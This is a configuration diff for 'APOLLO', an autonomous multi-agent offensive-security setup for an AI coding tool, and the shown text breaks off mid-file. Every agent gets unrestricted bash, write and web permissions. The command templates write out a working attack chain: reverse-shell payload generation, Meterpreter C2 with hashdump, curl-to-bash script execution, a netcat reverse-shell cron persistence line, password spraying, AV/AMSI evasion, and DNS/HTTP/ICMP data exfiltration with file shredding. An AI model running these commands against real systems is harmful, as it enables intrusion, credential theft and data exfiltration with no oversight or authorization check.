@@ -1,0 +1,481 @@
+{
+  "$schema": "https://opencode.ai/config.json",
+  "model": "{env:APOLLO_MODEL:opencode/deepseek-v4-flash-free}",
+  "small_model": "{env:APOLLO_SMALL_MODEL:opencode/north-mini-code-free}",
+  "default_agent": "apollo-ultra",
+  "provider": {
+    "deepseek": {
+      "options": {
+        "apiKey": "{env:DEEPSEEK_API_KEY}",
+        "baseURL": "https://api.deepseek.com"
+      }
+    },
+    "zhipuai": {
+      "options": {
+        "baseURL": "https://open.bigmodel.cn/api/paas/v4"
+      },
+      "models": {
+        "glm-5.2": {
+          "name": "GLM-5.2",
+          "limit": { "context": 128000, "output": 8192 }
+        },
+        "glm-5.2-flash": {
+          "name": "GLM-5.2-Flash",
+          "limit": { "context": 128000, "output": 8192 }
+        }
+      }
+    }
+  },
+  "agent": {
+    "apollo-ultra": {
+      "description": "APOLLO ULTRA - Primary command & control agent (default)",
+      "mode": "primary",
+  "model": "{env:APOLLO_MODEL:zhipuai/glm-5.2}",
+      "temperature": 0.0,
+      "permission": {
+        "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow"
+      },
+      "color": "#FF0000"
+    },
+
+    "apollo-big-pickle": {
+      "description": "APOLLO ULTRA on big-pickle (free, high capacity)",
+      "mode": "primary", "model": "opencode/big-pickle", "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FF5733"
+    },
+    "apollo-nemotron": {
+      "description": "APOLLO ULTRA on nemotron-3-ultra-free",
+      "mode": "primary", "model": "opencode/nemotron-3-ultra-free", "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#33FF57"
+    },
+    "apollo-north": {
+      "description": "APOLLO ULTRA on north-mini-code-free (lightweight)",
+      "mode": "primary", "model": "opencode/north-mini-code-free", "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#3357FF"
+    },
+    "apollo-mimo": {
+      "description": "APOLLO ULTRA on mimo-v2.5-free",
+      "mode": "primary", "model": "opencode/mimo-v2.5-free", "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FF33F5"
+    },
+    "apollo-deepseek-v4": {
+      "description": "APOLLO ULTRA on deepseek-v4-pro (requires API key)",
+      "mode": "primary", "model": "deepseek/deepseek-v4-pro", "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FFD700"
+    },
+    "apollo-autopwn": {
+      "description": "APOLLO Auto-Pwn Specialist - Autonomous exploitation intelligence",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FF4444"
+    },
+    "apollo-graph": {
+      "description": "APOLLO Attack Graph Specialist - Graph-based pathfinding and surface analysis",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#44FF44"
+    },
+    "apollo-c2cmd": {
+      "description": "APOLLO C2 Commander - Unified session management and pivoting",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#4488FF"
+    },
+    "apollo-vault": {
+      "description": "APOLLO Credential Vault Specialist - Credential intelligence and reuse",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FF8800"
+    },
+    "apollo-ioc": {
+      "description": "APOLLO IOC Engine Specialist - IOC extraction, enrichment, STIX",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#8800FF"
+    },
+    "apollo-monitor": {
+      "description": "APOLLO Recon Monitor - Continuous monitoring and change detection",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#00FFFF"
+    },
+    "apollo-exploitdb": {
+      "description": "APOLLO Exploit DB Sync - CVE-EDB matching and local cache",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FFFF00"
+    },
+    "apollo-recon": {
+      "description": "APOLLO Reconnaissance Specialist - Passive and active intelligence gathering",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#00AA00"
+    },
+    "apollo-exploit": {
+      "description": "APOLLO Exploitation Specialist - Vulnerability exploitation and payload generation",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FF0000"
+    },
+    "apollo-post": {
+      "description": "APOLLO Post-Exploitation Specialist - Persistence, privilege escalation, lateral movement",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#AA00AA"
+    },
+    "apollo-ad": {
+      "description": "APOLLO Active Directory Specialist - AD enumeration, kerberos attacks, bloodhound analysis",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#0055FF"
+    },
+    "apollo-web": {
+      "description": "APOLLO Web Application Specialist - SQLi, XSS, fuzzing, API testing",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FFA500"
+    },
+    "apollo-cloud": {
+      "description": "APOLLO Cloud Security Specialist - AWS/Azure/GCP enumeration",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#00CCFF"
+    },
+    "apollo-report": {
+      "description": "APOLLO Reporting Specialist - Professional report generation with MITRE ATT&CK mapping",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#888888"
+    },
+    "apollo-pivot": {
+      "description": "APOLLO Pivot/Penetration Specialist - Network pivoting, proxy chains, lateral movement",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#FF5500"
+    },
+    "apollo-evasion": {
+      "description": "APOLLO Evasion Specialist - AV/EDR bypass, payload obfuscation, AMSI bypass",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#00AA88"
+    },
+    "apollo-log-analysis": {
+      "description": "APOLLO Log Analysis Specialist - Log parsing, threat hunting, IOC extraction",
+      "mode": "subagent",
+      "subagent_type": "general",
+      "temperature": 0.0,
+      "permission": { "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+        "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+        "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+        "external_directory": "allow" },
+      "color": "#AAAA00"
+    }
+  },
+  "permission": {
+    "bash": "allow", "read": "allow", "edit": "allow", "write": "allow",
+    "glob": "allow", "grep": "allow", "webfetch": "allow", "websearch": "allow",
+    "task": "allow", "todowrite": "allow", "skill": "allow", "question": "allow",
+    "external_directory": "allow", "lsp": "allow", "doom_loop": "allow"
+  },
+  "instructions": [
+    "{env:HOME}/.config/opencode/apollo_instructions.md"
+  ],
+  "command": {
+    "recon": {
+      "template": "Execute a full reconnaissance operation on $ARGUMENTS. Use the apollo-recon subagent via task for complex multi-tool stages. Phase 1: subfinder -d $ARGUMENTS -silent + amass enum -passive -d $ARGUMENTS + curl -s 'https://crt.sh/?q=%25.$ARGUMENTS&output=json' | jq -r '.[].name_value' | sort -u > /tmp/subdomains_$ARGUMENTS.txt. Phase 2: httpx -silent -title -tech-detect -status-code -l /tmp/subdomains_$ARGUMENTS.txt -o /tmp/live_$ARGUMENTS.txt. Phase 3: gowitness scan file -f /tmp/live_$ARGUMENTS.txt --screenshot-path /tmp/screenshots/. Phase 4: subjack -w /tmp/subdomains_$ARGUMENTS.txt -t 100 -timeout 30 -o /tmp/takeovers_$ARGUMENTS.txt. Phase 5: theHarvester -d $ARGUMENTS -b all -f /tmp/harvester_$ARGUMENTS.html. Phase 6: naabu -host $ARGUMENTS -top-ports 1000 -o /tmp/naabu_$ARGUMENTS.txt. Phase 7: nmap -sV -sC -iL /tmp/live_$ARGUMENTS.txt -oN /tmp/nmap_$ARGUMENTS.txt. After each phase, inject findings into the knowledge base using: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_add_host\",\"args\":{\"ip\":\"...\"}}' and findings_parser.py. Correlate with: python3 ~/.config/opencode/apollo-engine/correlator.py --project $ARGUMENTS --nmap /tmp/nmap_$ARGUMENTS.txt. Finally return the /plan attack plan.",
+      "description": "Full reconnaissance with APOLLO engine integration"
+    },
+    "scan": {
+      "template": "Perform comprehensive vulnerability scanning on $ARGUMENTS. Phase 1: naabu -host $ARGUMENTS -top-ports 1000 -o /tmp/naabu_scan.txt. Phase 2: nmap -sV -sC -p- -T4 $ARGUMENTS -oN /tmp/nmap_full.txt. Phase 3: nuclei -target $ARGUMENTS -t ~/nuclei-templates -severity critical,high,medium -o /tmp/nuclei_results.json -json. Phase 4: nikto -h $ARGUMENTS -o /tmp/nikto_$ARGUMENTS.html -Format html. Phase 5: Correlate: python3 ~/.config/opencode/apollo-engine/correlator.py --project $ARGUMENTS --nmap /tmp/nmap_full.txt --nuclei /tmp/nuclei_results.json. Phase 6: Generate attack plan: python3 ~/.config/opencode/apollo-engine/planner.py $ARGUMENTS. Report all findings with severity ratings and MITRE ATT&CK mappings.",
+      "description": "Comprehensive vulnerability scanning with APOLLO correlation"
+    },
+    "web": {
+      "template": "Full web application assessment on $ARGUMENTS. Phase 1: Directory fuzzing: ffuf -u $ARGUMENTS/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.html,.bak,.asp,.aspx -o /tmp/ffuf_results.json -of json. Phase 2: SQL injection: sqlmap -u \"$ARGUMENTS\" --batch --random-agent --level=3 --risk=2 --output-dir=/tmp/sqlmap_results. Phase 3: XSS scanning: dalfox url $ARGUMENTS --silence -o /tmp/dalfox_results.txt. Phase 4: WordPress scan (if WP detected): wpscan --url $ARGUMENTS --enumerate vp,vt,u -o /tmp/wpscan_results.json. Phase 5: Nikto: nikto -h $ARGUMENTS -o /tmp/nikto_web.html -Format html. Phase 6: Inject findings: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_add_vuln\",\"args\":{\"ip\":\"'$(echo $ARGUMENTS | cut -d/ -f3)'\",\"name\":\"...\"}}'. Report consolidated findings.",
+      "description": "Full web application security assessment"
+    },
+    "ad": {
+      "template": "Active Directory assessment on $ARGUMENTS. Phase 1: ldapsearch -x -H ldap://$ARGUMENTS -b \"\" -s base namingcontexts 2>/dev/null. Phase 2: enum4linux -a $ARGUMENTS 2>/dev/null | tee /tmp/enum4linux_$ARGUMENTS.txt. Phase 3: impacket-GetNPUsers -dc-ip $ARGUMENTS \"$ARGUMENTS/\" -format hashcat -outputfile /tmp/asrep_$ARGUMENTS.txt. Phase 4: If credentials available: impacket-GetUserSPNs -dc-ip $ARGUMENTS \"<domain>/<user>:<pass>\" -outputfile /tmp/kerberoast_$ARGUMENTS.txt. Phase 5: bloodhound-python -d \"$ARGUMENTS\" -c All -ns $ARGUMENTS --zip --dns-timeout 5 -o /tmp/bloodhound_$ARGUMENTS. Phase 6: crackmapexec smb $ARGUMENTS -u '' -p '' --shares 2>/dev/null. Phase 7: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_add_host\",\"args\":{\"ip\":\"$ARGUMENTS\",\"hostname\":\"DC\"}}'. Return all findings with BloodHound attack paths suggested.",
+      "description": "Active Directory security assessment with APOLLO engine"
+    },
+    "spray": {
+      "template": "Password spraying. Parse $ARGUMENTS as 'targets user password domain'. Use crackmapexec with multiple protocols: crackmapexec smb <targets> -u <user> -p '<password>' --continue-on-success; crackmapexec winrm <targets> -u <user> -p '<password>' --continue-on-success; crackmapexec ssh <targets> -u <user> -p '<password>' --continue-on-success. Log successes to: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_add_cred\"...}'. Report which targets had successful logins.",
+      "description": "Multi-protocol password spraying with crackmapexec"
+    },
+    "crack": {
+      "template": "Crack $ARGUMENTS using hashcat. Parse hash format, auto-detect mode. Phase 1: hashid $ARGUMENTS | head -20. Phase 2: hashcat -m <detected_mode> -a 0 $ARGUMENTS /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -o /tmp/cracked.txt --outfile-format 2. Phase 3: If no crack: hashcat -m <mode> -a 3 $ARGUMENTS ?a?a?a?a?a?a?a?a --force. Phase 4: Inject cracked creds into KB: for each cracked, run mcp_server.py with add_credential. Report cracked passwords.",
+      "description": "Auto-detect hash type and crack with hashcat"
+    },
+    "exploit": {
+      "template": "Exploit development chain for $ARGUMENTS. Phase 1: searchsploit $ARGUMENTS -w | tee /tmp/searchsploit_results.txt. Phase 2: Check Metasploit modules: msfconsole -q -x \"search $ARGUMENTS; exit\" | head -30. Phase 3: If web target, test sqlmap: sqlmap -u \"$ARGUMENTS\" --batch --random-agent --level=5 --risk=3. Phase 4: Generate payload: msfvenom -p linux/x64/shell_reverse_tcp LHOST=$(ip -4 addr show eth0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}') LPORT=4444 -f elf -o /tmp/payload.elf. Phase 5: Set up listener: msfconsole -q -x \"use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST $(ip -4 addr show eth0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'); set LPORT 4444; exploit -j\". Phase 6: Deploy and execute. Store session info in KB.",
+      "description": "Full exploit chain: research, payload, delivery, C2"
+    },
+    "c2": {
+      "template": "C2 operations. Parse $ARGUMENTS as 'command session_id' or 'setup lhost lport'. Setup: msfconsole -q -x \"use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <lhost>; set LPORT <lport>; exploit -j\". For existing sessions: sessions -l; sessions -i <id>; sysinfo; getsystem; hashdump. For Sliver: sliver-client --config ~/sliver-client.cfg. For Covenant: curl -s -X POST http://127.0.0.1:7443/api/grunts. Track active sessions in KB: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_sessions\"}'. Report all active sessions and their privileges.",
+      "description": "C2 operations with Metasploit, Sliver, and Covenant"
+    },
+    "privesc": {
+      "template": "Privilege escalation on $ARGUMENTS. If Linux: curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas_output.txt; analyze output for SUID, capabilities, kernel exploits, sudo misconfigs. If Windows: curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o /tmp/winpeas.exe; /tmp/winpeas.exe | tee /tmp/winpeas_output.txt. Check: uname -a; cat /etc/os-release; id; sudo -l 2>/dev/null; find / -perm -4000 2>/dev/null; cat /etc/crontab 2>/dev/null; systemctl list-timers --all 2>/dev/null. Store findings and suggest escalation path.",
+      "description": "Automated privilege escalation with PEASS + manual checks"
+    },
+    "persist": {
+      "template": "Establish persistence. Parse $ARGUMENTS as 'target os user password technique'. Linux: SSH authorized_keys (cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys); cron (echo '*/5 * * * * nc -e /bin/bash <lhost> <lport>' | crontab -); systemd service. Windows: schtasks /create /tn \"Updater\" /tr \"powershell -enc <base64>\" /sc onlogon /ru SYSTEM; WMI event subscription; registry Run key. Store persistence mechanism details in KB for later cleanup.",
+      "description": "Establish persistence via cron, SSH keys, WMI, schtasks"
+    },
+    "exfil": {
+      "template": "Exfiltrate data. Parse $ARGUMENTS as 'file protocol server'. Compression: gzip -c <file> > /tmp/exfil.tmp; encrypt: openssl enc -aes-256-cbc -salt -in /tmp/exfil.tmp -out /tmp/exfil.enc -pass pass:apollo. DNS exfil: for chunk in $(base64 /tmp/exfil.enc | fold -w 32); do nslookup $chunk.<dns_server>; done. HTTP: curl -F \"data=@/tmp/exfil.enc\" <server>/upload. ICMP: ping -s 1024 -c 5 <server> -p $(xxd -p -l 1024 /tmp/exfil.enc). Clean up: shred -u /tmp/exfil* <file>.",
+      "description": "Encrypted multi-protocol data exfiltration"
+    },
+    "cloud": {
+      "template": "Cloud enumeration for $ARGUMENTS. Parse as 'provider action target'. AWS: aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances; aws iam list-users; aws s3api list-buckets; cloud_enum -k $ARGUMENTS -m aws. Azure: az account show; az vm list; az storage account list; az role assignment list. GCP: gcloud projects list; gcloud compute instances list; gcloud iam service-accounts list. Report all exposed resources and misconfigurations.",
+      "description": "Multi-cloud enumeration with AWS, Azure, GCP"
+    },
+    "report": {
+      "template": "Generate a professional penetration testing report. Run: python3 ~/.config/opencode/apollo-engine/report_generator.py \"$(echo $APOLLO_PROJECT)\" /tmp/apollo_report.md. Include executive summary, scope, methodology, risk-rated findings with evidence, MITRE ATT&CK technique mapping, credentials discovered, attack chain timeline, remediation recommendations. Format as professional markdown. If pandoc is available, convert to PDF.",
+      "description": "Professional report with MITRE ATT&CK mapping"
+    },
+    "plan": {
+      "template": "Generate attack plan from knowledge base. Run: python3 ~/.config/opencode/apollo-engine/planner.py \"$(echo $APOLLO_PROJECT)\". This analyzes all hosts, vulnerabilities, and credentials in the KB and constructs a Cyber Kill Chain attack plan. Review the plan and recommend which phase to execute next.",
+      "description": "Generate Cyber Kill Chain attack plan from KB"
+    },
+    "status": {
+      "template": "Report operational status. Run: python3 ~/.config/opencode/apollo-engine/kb_manager.py summary. Also check: active services (msfrpcd, sliver); active sessions (msfconsole -q -x 'sessions -l; exit'); recent commands log from KB. Present a clear operational picture with next recommended actions.",
+      "description": "Show full operational status"
+    },
+    "setup": {
+      "template": "Full APOLLO environment setup. Phase 1: Install APT packages (nmap, nuclei, subfinder, amass, httpx, naabu, gowitness, sqlmap, metasploit-framework, hashcat, john, theharvester, bloodhound, crackmapexec, responder, hydra, medusa, wpscan, trufflehog, seclists, jq, python3-pip). Phase 2: Pip3 install (impacket, crackmapexec, cloud_enum, shodan, censys). Phase 3: Initialize KB: python3 ~/.config/opencode/apollo-engine/kb_manager.py init. Phase 4: Create default project: python3 ~/.config/opencode/apollo-engine/kb_manager.py project default. Phase 5: Update nuclei templates: nuclei -update-templates. Phase 6: Start msfrpcd if available. Phase 7: Update locate DB. Phase 8: Decompress rockyou if needed. Phase 9: Verify all tools work. Report success/failure.",
+      "description": "Full APOLLO engine and tool installation"
+    },
+    "build": {
+      "template": "You are in BUILD mode - full development agent with all tools. Execute: $ARGUMENTS. Use bash, read, write, edit as needed to accomplish the task. This is the default unrestricted OpenCode agent.",
+      "description": "Switch to build agent for general dev work",
+      "agent": "build"
+    },
+    "plan-agent": {
+      "template": "You are in PLAN mode - analysis and planning without making changes. Analyze: $ARGUMENTS. Create detailed plans but do NOT write or edit any files. Permission: read=ask, edit=deny, bash=ask.",
+      "description": "Switch to plan agent for analysis",
+      "agent": "plan"
+    },
+    "explore": {
+      "template": "You are in EXPLORE mode - fast read-only codebase exploration. Research: $ARGUMENTS. Use grep, glob, read to find files and patterns. Do NOT write, edit, or run bash commands that modify anything.",
+      "description": "Explore codebase with read-only agent",
+      "agent": "explore"
+    },
+    "scout": {
+      "template": "You are in SCOUT mode - research external docs and dependencies. Investigate: $ARGUMENTS. Use webfetch, websearch to gather information from external sources. Read-only mode.",
+      "description": "Research external docs and dependencies",
+      "agent": "scout"
+    },
+    "general": {
+      "template": "You are in GENERAL mode - general-purpose multi-step task execution. Handle: $ARGUMENTS. Has full tool access (except todowrite). Execute complex research or multi-step tasks.",
+      "description": "General-purpose research and task execution",
+      "agent": "general"
+    },
+    "pivot": {
+      "template": "Execute network pivot through $ARGUMENTS. Parse as 'pivot_ip target_subnet/range'. Phase 1: Check SSH access to pivot host. Phase 2: Establish SOCKS proxy: ssh -D 1080 user@pivot_ip -N -f. Phase 3: Scan through proxy: proxychains nmap -sT -Pn target_range -oN /tmp/pivot_scan.txt. Phase 4: Check available lateral movement tools (wmiexec, psexec, ssh). Phase 5: Run: python3 ~/.config/opencode/apollo-engine/pivot_planner.py pivot_ip target_range. Phase 6: Store attack paths in KB: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_add_path\",\"args\":{\"source\":\"pivot_ip\",\"target\":\"target_range\",\"technique\":\"Network Pivot\"}}'. Recommend best lateral movement approach.",
+      "description": "Network pivot with proxy chains and lateral movement"
+    },
+    "evasion": {
+      "template": "Generate evasion payload for $ARGUMENTS. Parse $ARGUMENTS as 'lhost lport platform'. Run: evasion_engine.py payload <lhost> <lport> <platform> 2>/dev/null || echo 'Generating standard payload'. Generate and optionally pack payload. For Windows: use msfvenom with encoders, ScareCrow if available, or Donut. For Linux: msfvenom + UPX pack + AES encrypt. Include AMSI bypass if PowerShell loader. Include sandbox detection checks. Report which evasion techniques were applied and expected detection rate.",
+      "description": "Generate evasive payload with AV/EDR bypass"
+    },
+    "log-analysis": {
+      "template": "Analyze logs for $ARGUMENTS. Parse as 'log_file_path [type]' or 'target/range'. Use: grep, awk, jq, python3 to parse. Extract: auth failures (brute force), successful logins (lateral movement), process creation (execution), network connections (C2). Extract IOCs (IPs, hashes, domains). Correlate findings with KB vulns. Store timeline events: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"kb_timeline\"}'. Report: attack timeline, IOCs found, TTPs identified.",
+      "description": "Parse logs, hunt threats, extract IOCs"
+    },
+    "tool-check": {
+      "template": "Audit tool availability. Run: python3 ~/.config/opencode/apollo-engine/kali_tools.py. Report which tools are present and which are missing. For missing essential tools, recommend: python3 ~/.config/opencode/apollo-engine/kali_tools.py install <tool>. Also check Kali paths: /usr/share/wordlists/rockyou.txt (may need gunzip), /usr/share/seclists (may need apt install seclists). Suggest install commands for any missing critical tools.",
+      "description": "Check tool availability and Kali paths"
+    },
+    "switch": {
+      "template": "Switch to $ARGUMENTS agent/model.\n\nBuilt-in OpenCode agents (always available):\n  Primary: @build (unrestricted dev), @plan (analysis, no edits)\n  Subagents: @general (multi-step tasks), @explore (code search), @scout (research)\n\nAPOLLO primary agents: @apollo-ultra (default), @apollo-big-pickle, @apollo-nemotron, @apollo-north, @apollo-mimo, @apollo-deepseek-v4\n\nAPOLLO subagents (17): @apollo-autopwn, @apollo-graph, @apollo-c2cmd, @apollo-vault, @apollo-ioc, @apollo-monitor, @apollo-exploitdb, @apollo-recon, @apollo-exploit, @apollo-post, @apollo-ad, @apollo-web, @apollo-cloud, @apollo-report, @apollo-pivot, @apollo-evasion, @apollo-log-analysis\n\nUsage:\n  Use @agent-name in chat to invoke any agent.\n  Use /build, /plan-agent, /explore, /scout, /general to route commands to built-in agents.\n  Use /switch <name> to activate an APOLLO primary agent.\n  For primary agent switching, reload with --agent flag.",
+      "description": "Switch agent/model or spawn subagent specialist"
+    },
+    "agents": {
+      "template": "List all available agents. Built-in: build (primary), plan (primary), general (sub), explore (sub), scout (sub). APOLLO: apollo-ultra (primary), apollo-big-pickle (primary), apollo-nemotron (primary), apollo-north (primary), apollo-mimo (primary), apollo-deepseek-v4 (primary). APOLLO subagents (17): apollo-autopwn, apollo-graph, apollo-c2cmd, apollo-vault, apollo-ioc, apollo-monitor, apollo-exploitdb, apollo-recon, apollo-exploit, apollo-post, apollo-ad, apollo-web, apollo-cloud, apollo-report, apollo-pivot, apollo-evasion, apollo-log-analysis. Describe each agent's role and suggest which to use.",
+      "description": "List all available agents and their roles"
+    },
+    "kb": {
+      "template": "Knowledge base operation: $ARGUMENTS. Usage: 'summary' - show KB stats; 'add host <ip> <hostname>' - add host; 'add vuln <ip> <name> <severity>' - add vuln; 'add cred <ip> <user> <pass> <service>' - add cred; 'export' - export all KB data; 'project <name>' - switch project. Run: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"$ARGUMENTS\"}'.",
+      "description": "Knowledge base management operations"
+    },
+    "workflow": {
+      "template": "Execute automated workflow $ARGUMENTS. Parse as '<workflow_name> <target>'. Available: full-kill-chain, quick-win, web-deep, ad-exploit, container-audit, api-security, wireless-audit, full-assessment. Run: python3 ~/.config/opencode/apollo-engine/orchestrator.py <workflow_name> <target>. This chains all phases and generates a report.",
+      "description": "Execute automated attack workflow"
+    },
+    "cve": {
+      "template": "CVE operations. Parse $ARGUMENTS as '<action> <args>'. Actions: fetch <CVE-ID> (get CVE details), search <keyword> (search CVEs), enrich-all (enrich all KB vulns). Run: python3 ~/.config/opencode/apollo-engine/nvd_enricher.py <action> <args>. For enrich-all: python3 ~/.config/opencode/apollo-engine/mcp_server.py '{\"action\":\"cve_enrich_all\"}'.",
+      "description": "CVE lookup, search, and KB enrichment via NVD API"
+    },
+    "notify": {
+      "template": "Notification management. Parse $ARGUMENTS as '<action> [message]'. Actions: configure (interactive setup), test (send test), alert <severity> <message> (send alert). Run: python3 ~/.config/opencode/apollo-engine/notifications.py <action> <args>.",
+      "description": "Configure and send alerts via Slack/Discord/Telegram"
+    },
+    "bloodhound": {
